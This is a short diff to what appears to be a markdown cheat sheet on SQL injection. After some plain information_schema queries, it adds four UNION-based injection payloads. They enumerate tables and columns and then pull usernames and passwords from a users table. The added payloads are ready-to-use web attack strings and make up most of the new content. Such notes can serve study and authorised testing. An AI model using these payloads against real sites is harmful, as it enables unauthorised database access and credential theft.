@@ -513,6 +513,11 @@ SELECT * FROM information_schema.tables;
 SELECT * FROM information_schema.columns;
 SELECT table_name FROM information_schema.tables
 SELECT column_name FROM information_schema.columns
+
+' UNION SELECT 1,2,3 FROM information_schema.tables;-- - asd
+' UNION SELECT 1,2,CONCAT(TABLE_NAME) FROM information_schema.tables;-- - asd
+' UNION SELECT 1,2,CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='user';-- - asd
+' UNION SELECT 1,2,CONCAT(username,pwd) FROM users;-- - asd
 ```
 
 ### Testing sql injection using sqlfiddle
